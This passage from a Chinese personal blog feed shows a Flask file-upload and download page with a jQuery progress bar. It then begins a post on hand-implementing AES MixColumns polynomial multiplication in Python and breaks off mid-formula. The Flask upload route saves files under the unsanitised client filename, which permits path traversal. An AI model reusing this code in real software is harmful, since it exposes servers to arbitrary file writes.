class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf8&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/fomantic-ui@2.8.8/dist/semantic.min.css&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/fomantic-ui@2.8.8/dist/semantic.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>wuuconix&#x27;s page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;padding-top: 5em;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui text container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui placeholder segment&quot;</span>&gt;</span><br>            &#123;% if filelist == [] %&#125;<br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui icon header&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pdf file outline icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>                    目前文件夹里空空如也<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            &#123;% else %&#125;<br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui list&quot;</span>&gt;</span><br>                &#123;% for file in filelist%&#125;<br>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;file icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;header&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;download/&#123;&#123;file&#125;&#125;&quot;</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">&quot;点击下载&#123;&#123;file&#125;&#125;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;files&quot;</span>&gt;</span>&#123;&#123;file&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                &#123;% endfor %&#125;<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            &#123;% endif %&#125;<br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui buttons&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui primary button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;button_choose&quot;</span>&gt;</span>选择文件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui positive button&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;button_submit&quot;</span>&gt;</span>上传<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;input_file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: none;&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui divider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui indicating progress&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;progress&quot;</span> <span class="hljs-attr">data-value</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">data-total</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span> <br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;bar&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;progress&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;label&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    $(<span class="hljs-variable language_">document</span>).<span class="hljs-title function_">ready</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#progress&quot;</span>).<span class="hljs-title function_">hide</span>();</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#button_submit&quot;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">true</span>);</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    $(<span class="hljs-string">&quot;#button_choose&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#input_file&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    $(<span class="hljs-string">&quot;#input_file&quot;</span>).<span class="hljs-title function_">bind</span>(<span class="hljs-string">&quot;input propertychange&quot;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> name = ($(<span class="hljs-variable language_">this</span>).<span class="hljs-title function_">prop</span>(<span class="hljs-string">&#x27;files&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#button_submit&quot;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span>);</span><br><span class="language-javascript">        $(<span class="hljs-string">&#x27;#button_choose&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">innerHTML</span>=name;</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    $(<span class="hljs-string">&quot;#button_submit&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        $(<span class="hljs-string">&quot;#progress&quot;</span>).<span class="hljs-title function_">show</span>();</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> formdata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>($(<span class="hljs-string">&quot;#form&quot;</span>)[<span class="hljs-number">0</span>]); </span><br><span class="language-javascript">        $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>:<span class="hljs-string">&#x27;/upload&#x27;</span>, </span><br><span class="language-javascript">            <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;post&#x27;</span>, </span><br><span class="language-javascript">            <span class="hljs-attr">xhr</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> xhr = $.ajaxSettings.<span class="hljs-title function_">xhr</span>();</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> starttime = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() / <span class="hljs-number">1000</span>);</span><br><span class="language-javascript">                xhr.<span class="hljs-property">upload</span>.<span class="hljs-property">onprogress</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">lengthComputable</span>) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">var</span> uploaded = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(e.<span class="hljs-property">loaded</span> / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">1024</span>,<span class="hljs-number">2</span>));</span><br><span class="language-javascript">                        <span class="hljs-keyword">var</span> spenttime = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() / <span class="hljs-number">1000</span>) - starttime;</span><br><span class="language-javascript">                        <span class="hljs-keyword">var</span> speed = (uploaded / spenttime).<span class="hljs-title function_">toFixed</span>(<span class="hljs-number">2</span>);</span><br><span class="language-javascript">                        <span class="hljs-keyword">var</span> progress = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(e.<span class="hljs-property">loaded</span> / e.<span class="hljs-property">total</span> * <span class="hljs-number">100</span>);</span><br><span class="language-javascript">                        $(<span class="hljs-string">&quot;#progress&quot;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&#x27;data-value&#x27;</span>, progress);</span><br><span class="language-javascript">                        $(<span class="hljs-string">&quot;#progress&quot;</span>).<span class="hljs-title function_">progress</span>(<span class="hljs-string">&#x27;update progress&#x27;</span>, progress);</span><br><span class="language-javascript">                        $(<span class="hljs-string">&quot;#progress&quot;</span>).<span class="hljs-title function_">progress</span>(<span class="hljs-string">&#x27;set label&#x27;</span>, speed + <span class="hljs-string">&quot;MB/s&quot;</span>);</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> xhr;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">processData</span>:<span class="hljs-literal">false</span>, </span><br><span class="language-javascript">            <span class="hljs-attr">contentType</span>:<span class="hljs-literal">false</span>, </span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:formdata,</span><br><span class="language-javascript">            <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;</span><br><span class="language-javascript">                $(<span class="hljs-string">&#x27;body&#x27;</span>).<span class="hljs-title function_">toast</span>(&#123;</span><br><span class="language-javascript">                    <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;恭喜你&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你已经成功将 《&quot;</span> + $(<span class="hljs-string">&#x27;#button_choose&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">innerHTML</span> + <span class="hljs-string">&quot;》 上传至了武丑兄的机械革命。页面即将自动刷新&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">showProgress</span>: <span class="hljs-string">&#x27;bottom&#x27;</span>,</span><br><span class="language-javascript">                    <span class="hljs-attr">classProgress</span>: <span class="hljs-string">&#x27;red&#x27;</span></span><br><span class="language-javascript">                &#125;);</span><br><span class="language-javascript">                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&quot;location.reload();&quot;</span>, <span class="hljs-number">3000</span>)  </span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;#progress&#x27;</span>).<span class="hljs-title function_">progress</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">label</span>: <span class="hljs-string">&#x27;percent&#x27;</span>,</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;a&#x27;</span>).<span class="hljs-title function_">popup</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">on</span>: <span class="hljs-string">&#x27;hover&#x27;</span></span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript">    $(<span class="hljs-string">&quot;#button_submit&quot;</span>).<span class="hljs-title function_">popup</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">on</span>: <span class="hljs-string">&#x27;hover&#x27;</span></span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template, Flask, request, make_response, send_from_directory<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_filelist</span>():<br>    filelist = os.listdir(<span class="hljs-string">&quot;upload/&quot;</span>)<br>    <span class="hljs-keyword">return</span> filelist<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">filelist=[]</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, filelist=get_filelist())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        f = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(request.files)<br>        f.save(<span class="hljs-string">f&quot;upload/<span class="hljs-subst">&#123;f.filename&#125;</span>&quot;</span>)<br>        filelist = get_filelist()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, filelist=filelist)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, filelist=get_filelist())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download/&lt;filename&gt;&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">filename</span>):<br>    response = make_response(send_from_directory(<span class="hljs-string">&quot;upload&quot;</span>, filename, as_attachment=<span class="hljs-literal">True</span>))<br>    response.headers[<span class="hljs-string">&quot;Content-Disposition&quot;</span>] = <span class="hljs-string">&quot;attachment; filename=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename.encode().decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br>    <span class="hljs-keyword">return</span> response<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><h2 id="效果"><a class="markdownIt-Anchor" href="#效果"></a> 效果</h2><p><img src="https://upyun.wuuconix.link/image-20211013002443433.png" alt="界面" /></p><p><img src="https://upyun.wuuconix.link/image-20211013002519439.png" alt="上传1" /></p><p><img src="https://upyun.wuuconix.link/image-20211013002548974.png" alt="上传2" /></p><p><img src="https://upyun.wuuconix.link/image-20211013002646644.png" alt="上传3" /></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>jquery</tag>
      
      <tag>ajax</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AES 加解密 python手动实现</title>
    <link href="/2021/10/08/aes/"/>
    <url>/2021/10/08/aes/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-NPNEfeZn" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="26341140" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>很久之前就用python实现了des的加解密，了解了代替和置用python代码实现的过程。但是在试图实现AES的时候遇到了多项式乘法的困难，一直搁置到昨天。</p><p>昨天是密码学分组密码实验，可以从分组密码里选择一个来实现，其实我可以直接把我的des糊弄糊弄就完事了，但是老杜提出应该挑战自我。</p><p>我们便开始研究多项式乘法 代码实现的方法，在明确转化为多项式再进行运算的不现实性之后，我们将眼光转到了<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E6%95%B0%E4%B9%98%E6%B3%95/22761415">多项式乘法</a>。试图用二进制的乘法来模拟多项式的运算。</p><p>在讨论许久之后，我们用实践证明了这种方式的可行性。</p><h2 id="多项式乘法"><a class="markdownIt-Anchor" href="#多项式乘法"></a> 多项式乘法</h2><p>AES的S表的值可以用多项式算出来，为了减轻负担，直接选择查表。那是不是就可以不用管多项式了呢？不，在列混合<code>MixColumn</code>的运算过程中利用到了多项式乘法。</p><p><img src="https://upyun.wuuconix.link/image-20211008204252338.png" alt="MixColumn" /></p><p>在得到<code>28</code>这个值的时候实际上运用到了矩阵乘法。乘的时候将每个元素都对应的转化为了多项式。比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>03</mn></mrow><annotation encoding="application/x-tex">03</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">3</span></span></span></span>的二进制是<code>11</code>，所以它对应的多项式就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。而<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mi>D</mi></mrow><annotation encoding="application/x-tex">ED</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span></span></span></span>对应的二进制是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>11101101</mn></mrow><annotation encoding="application/x-tex">11101101</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span></span></span></span>，故它对应的多项式就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x^7+x^6+x^5+x^3+x^2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</p><p>这里算一下</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x+1)(x^7+x^6+x^5+x^3+x^2+1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span 